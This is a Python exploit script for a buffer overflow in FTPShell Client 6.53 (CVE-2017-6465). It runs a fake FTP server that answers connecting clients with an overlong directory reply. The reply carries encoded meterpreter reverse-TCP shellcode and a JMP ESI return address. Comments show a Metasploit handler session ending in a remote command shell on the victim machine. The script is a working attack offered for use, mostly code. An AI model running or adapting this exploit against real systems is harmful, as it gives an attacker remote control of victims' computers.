#!/usr/bin/python

#FTPShell Client 6.53 buffer overflow
#By N_A , N_A[at]tutanota.com
#Tested on Windows 7 Professional

#Credit to Peter Baris for finding the vulnerability and also submitting the CVE and public exploit.
#CVE: CVE-2017-6465
#Vendor Homepage: http://www.saptech-erp.com.au

#Tested on:
#Microsoft Windows 7 Professional
#6.1.7601 Service Pack 1 Build 7601
#x64



# msf > use exploit/multi/handler
# msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
# payload => windows/meterpreter/reverse_tcp
# msf exploit(handler) > set lhost 192.1.168.1
# lhost => 192.168.1.1
# msf exploit(handler) > set lport 443
# lport => 443
# msf exploit(handler) > exploit

# [*] Started reverse TCP handler on 192.168.1.1:443 
# [*] Starting the payload handler...

#[*] Sending stage (957999 bytes) to 192.168.1.5
#[*] Meterpreter session 1 opened (192.168.1.1:443 -> 192.168.1.5:49237) at 2017-03-14 17:00:35 +0000

#meterpreter > shell
#Process 3672 created.
#Channel 1 created.
#Microsoft Windows [Version 6.1.7601]
#Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

#C:\Program Files\FTPShellClient>





import socket
import sys

port = 21


#Replace LHOST with your own IP
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1 LPORT=443 EXITFUNC=thread -a x86 --platform Windows  -b "\x00\x0a\x0d\x5c\x22\x27" -f python -e x86/shikata_ga_nai
#Payload size: 381 bytes

buf =  ""
buf += "\xdb\xdf\xd9\x74\x24\xf4\x5e\x29\xc9\xbf\xa5\x89\x6c"
buf += "\xf6\xb1\x59\x31\x7e\x19\x03\x7e\x19\x83\xc6\x04\x47"
buf += "\x7c\x90\x1e\x05\x7f\x69\xdf\x69\x09\x8c\xee\xa9\x6d"
buf += "\xc4\x41\x19\xe5\x88\x6d\xd2\xab\x38\xe5\x96\x63\x4e"
buf += "\x4e\x1c\x52\x61\x4f\x0c\xa6\xe0\xd3\x4e\xfb\xc2\xea"
buf += "\x81\x0e\x02\x2a\xff\xe3\x56\xe3\x74\x51\x47\x80\xc0"
buf += "\x6a\xec\xda\xc5\xea\x11\xaa\xe4\xdb\x87\xa0\xbf\xfb"
buf += "\x26\x64\xb4\xb5\x30\x69\xf0\x0c\xca\x59\x8f\x8e\x1a"
buf += "\x90\x70\x3c\x63\x1c\x83\x3c\xa3\x9b\x7b\x4b\xdd\xdf"
buf += "\x06\x4c\x1a\x9d\xdc\xd9\xb9\x05\x97\x7a\x66\xb7\x74"
buf += "\x1c\xed\xbb\x31\x6a\xa9\xdf\xc4\xbf\xc1\xe4\x4d\x3e"
buf += "\x06\x6d\x15\x65\x82\x35\xce\x04\x93\x93\xa1\x39\xc3"
buf += "\x7b\x1e\x9c\x8f\x96\x4b\xad\xcd\xfe\xb8\x9c\xed\xfe"
buf += "\xd6\x97\x9e\xcc\x79\x0c\x09\x7d\xf2\x8a\xce\x82\x29"
buf += "\x6a\x40\x7d\xd1\x8b\x48\xba\x85\xdb\xe2\x6b\xa5\xb7"
buf += "\xf2\x94\x70\x2d\xf6\x02\x70\xb9\xf8\xa5\xec\xbf\xf8"
buf += "\x48\x57\x36\x1e\x1a\xf7\x19\x8f\xdb\xa7\xd9\x7f\xb4"
buf += "\xad\xd5\xa0\xa4\xce\x3f\xc9\x4f\x20\x96\xa1\xe7\xd9"
buf += "\xb3\x3a\x99\x26\x6e\x47\x99\xac\x9b\xb7\x54\x44\xe9"
buf += "\xab\x81\x35\x11\x34\x52\xdf\x11\x5e\x56\x49\x45\xf6"
buf += "\x54\xac\xa1\x59\xa6\x9b\xb1\x9e\x58\x5d\x80\xd5\x6f"
buf += "\xcb\xac\x81\x8f\x1b\x2d\x52\xc6\x71\x2d\x3a\xbe\x21"
buf += "\x7e\x5f\xc1\xfc\x12\xcc\x54\xfe\x42\xa0\xff\x96\x68"
buf += "\x9f\xc8\x39\x92\xca\x4a\x3d\x6c\x88\x6e\xe5\x05\x72"
buf += "\x2f\x15\xd6\x18\xaf\x45\xbe\xd7\x80\x6a\x0e\x17\x0b"
buf += "\x23\x06\x92\xda\x86\xb7\xa3\xf6\x46\x66\xa3\xf5\x52"
buf += "\x7f\x2a\xf9\x65\x80\xcc\xc6\xb0\xb9\xba\x0f\x01\xfe"
buf += "\xa5\x8d\xaf\x0b\x4e\x08\x3a\xb6\x13\xab\x91\xf5\x2d"
buf += "\x28\x13\x86\xc9\x30\x56\x83\x96\xf6\x8b\xf9\x87\x92"
buf += "\xab\xae\xa8\xb6"



#Exploitation requires a buffer of exactly 400 bytes. From there on EIP is overwritten. ESI contains our buffer. 
#400 bytes + EIP will redirect execution

eip = "\xDC\x95\x4B" #JMP ESI; retn , located @  0x004B95DC  in FtpShell.exe , address works perfectly.
nops = "\x90" * 10
padding = "A" * 9
buffer =  nops + buf + padding + eip


try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("0.0.0.0",port))
    s.listen(5)

    print("\n[*]FTPShell Client 6.53 buffer overflow[*]")
    print("[*]\tBy N_A\t[*]")
    print("\n[*]Fake FTP Daemon started[*]\n")
    print("[*]Awaiting for victim to connect[*]\n")
except:
       print("[*] Failed to bind the server to port\n")


while True:
    conn, addr = s.accept()
    conn.send("220 GutenTag Vater\r\n")
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send("230 OK\r\n")
    print(conn.recv(1024))
    conn.send('220 "'+buffer+'" is current directory\r\n')
    print("[*]Evil buffer sent. g0t sh3ll?[*]\n")
